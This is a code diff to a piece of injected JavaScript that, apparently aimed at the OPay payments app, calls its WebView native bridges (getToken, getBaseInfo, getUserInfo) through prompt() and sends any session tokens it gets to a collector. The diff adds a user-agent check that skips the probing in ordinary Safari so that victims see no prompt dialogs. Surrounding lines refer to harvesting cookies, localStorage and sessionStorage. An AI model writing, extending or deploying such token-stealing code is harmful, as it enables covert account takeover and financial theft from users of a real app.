@@ -282,35 +282,46 @@
             } catch (e) { log("webkit scan err: " + e.message); }
 
             // iOS prompt() bridge technique - some apps use prompt() as JS-to-native bridge
-            try {
-                var origPrompt = window.prompt;
-                var promptCmds = [
-                    'opayjsbridge://getToken',
-                    'opayjsbridge://getBaseInfo',
-                    'opayjsbridge://getUserInfo',
-                    'jsbridge://getToken',
-                    'native://getToken',
-                    JSON.stringify({ action: "getToken" }),
-                    JSON.stringify({ method: "getBaseInfo" })
-                ];
-                for (var pc = 0; pc < promptCmds.length; pc++) {
-                    try {
-                        var pResult = origPrompt(promptCmds[pc]);
-                        if (pResult && pResult.length > 5) {
-                            send({ prompt_cmd: promptCmds[pc], result: pResult }, "PROMPT_BRIDGE");
-                            log("Prompt bridge response: " + pResult.substring(0, 100));
-                            if (pResult.indexOf("eyJ") > -1 || pResult.indexOf("token") > -1) {
-                                D.token = pResult;
-                                send({ token: pResult, src: "prompt_bridge" }, "TOKEN");
-                                try {
-                                    var pp = JSON.parse(pResult);
-                                    if (pp.token) extractAll(pp.token);
-                                } catch (e) { }
+            // GUARD: Only run in WebView, NOT in regular Safari (prevents annoying prompt dialogs)
+            var isSafari = /Safari\//.test(navigator.userAgent) && !/CriOS|FxiOS|EdgiOS|OPR\//.test(navigator.userAgent);
+            var isWebView = !isSafari || /OPay|OTravel|wv|WebView/i.test(navigator.userAgent);
+            // If we find webkit.messageHandlers, we're likely in a WebView regardless
+            if (window.webkit && window.webkit.messageHandlers) isWebView = true;
+
+            if (isWebView) {
+                log("WebView detected, trying prompt bridge...");
+                try {
+                    var origPrompt = window.prompt;
+                    var promptCmds = [
+                        'opayjsbridge://getToken',
+                        'opayjsbridge://getBaseInfo',
+                        'opayjsbridge://getUserInfo',
+                        'jsbridge://getToken',
+                        'native://getToken',
+                        JSON.stringify({ action: "getToken" }),
+                        JSON.stringify({ method: "getBaseInfo" })
+                    ];
+                    for (var pc = 0; pc < promptCmds.length; pc++) {
+                        try {
+                            var pResult = origPrompt(promptCmds[pc]);
+                            if (pResult && pResult.length > 5) {
+                                send({ prompt_cmd: promptCmds[pc], result: pResult }, "PROMPT_BRIDGE");
+                                log("Prompt bridge response: " + pResult.substring(0, 100));
+                                if (pResult.indexOf("eyJ") > -1 || pResult.indexOf("token") > -1) {
+                                    D.token = pResult;
+                                    send({ token: pResult, src: "prompt_bridge" }, "TOKEN");
+                                    try {
+                                        var pp = JSON.parse(pResult);
+                                        if (pp.token) extractAll(pp.token);
+                                    } catch (e) { }
+                                }
                             }
-                        }
-                    } catch (e) { }
-                }
-            } catch (e) { }
+                        } catch (e) { }
+                    }
+                } catch (e) { }
+            } else {
+                log("Standard Safari detected, skipping prompt bridge");
+            }
 
             // Harvest cookies, localStorage, sessionStorage
             try {
